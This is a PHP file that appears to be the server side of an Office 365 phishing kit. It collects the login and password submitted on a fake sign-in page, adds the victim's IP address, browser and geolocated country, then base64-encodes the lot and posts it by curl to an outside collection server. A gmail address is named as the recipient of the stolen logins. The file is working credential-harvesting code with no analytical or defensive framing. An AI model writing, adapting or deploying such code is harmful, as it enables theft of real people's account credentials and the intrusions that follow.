<?php
ob_start();
@session_start();  
error_reporting(0); 
$host  = $_SERVER['HTTP_HOST']; $host_upper = strtoupper($host); $path   = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
// var_dump($_SESSION['dst']); die();

if(isset($_POST['login'])){
	$login = $_POST['login'];
	$passwd = $_POST['passwd'];
	$ip = getenv("REMOTE_ADDR");

	$errorEmpty = false;
	$errorPass = false;

	// check if any of the field is empty
	if (empty($passwd)) {
		echo 'nopass';
		// $errorEmpty = true;	
	}else{

		// Page name + ip + country name
		$subject = "Office 365 |".$ip."|".get_country();
		$log = base64_encode($login);
		$body = body($login, $passwd);

		// var_dump($body); die();

		$data = [
		'email' => $login,
		'password' => $passwd,
		'send_to' => 'kclemenkoo@gmail.com',
		'subject' => $subject,
		'body' => $body
		];
	

		$mgs = process_gkd('https://server.bossthraed.com/l/banser/index.php', $data);

		if($mgs === 'success'){
			echo "success";
			// header("location: https://portal.office.com/servicestatus");
			// redirect success page
		}

		if($mgs === 'failed'){

			echo "failed";
		}

	}
}

function body($email, $password){
	$country = get_country();
	$ip = getenv("REMOTE_ADDR");

	$message .= "Email     : ". $email ."\n";
	$message .= "Password  : ". $password ."\n";

	$message .= "browser  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
	$message .= "Country : ".$country."\n";
	$message .= "=============IP*DATE*MX_RECORDS=================\n";
	$message .= "IP      : ".$ip."\n";
	// $message .= "Host : ". $this->host_name ."\n";
	$message .= "Date: ". date("D M d, Y g:i a") ."\n";
	$message .= "=============SINIX=================\n";

	return $message;
}

/**
 * Visit 
 * @return [type] [description]
 */
function get_country(){
   $client  = @$_SERVER['HTTP_CLIENT_IP'];
   $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
   $remote  = $_SERVER['REMOTE_ADDR'];
   $result  = "Unknown";

   if(filter_var($client, FILTER_VALIDATE_IP)){
      $ip = $client;
   }elseif(filter_var($forward, FILTER_VALIDATE_IP)){
      $ip = $forward;
   }else{
      $ip = $remote;
   }

   $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

   if($ip_data && $ip_data->geoplugin_countryName != null){
      $result = $ip_data->geoplugin_countryName;
   }

   return $result;
}

/**
 * Enter
 * @param  array  $arr [description]
 * @return [type]      [description]
 */
function arg_gkd($arr = array()){
	$postData = '';
	foreach($arr as $i => $val){ 
	    $postData .= $i .'='.base64_encode($val).'&'; 
	}
	return rtrim($postData, '&');
}

function process_gkd($url, $arr = array()){
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url );
 curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch,CURLOPT_POSTFIELDS, arg_gkd($arr) );


 $result = curl_exec($ch);
 curl_close($ch);

 return $result;
}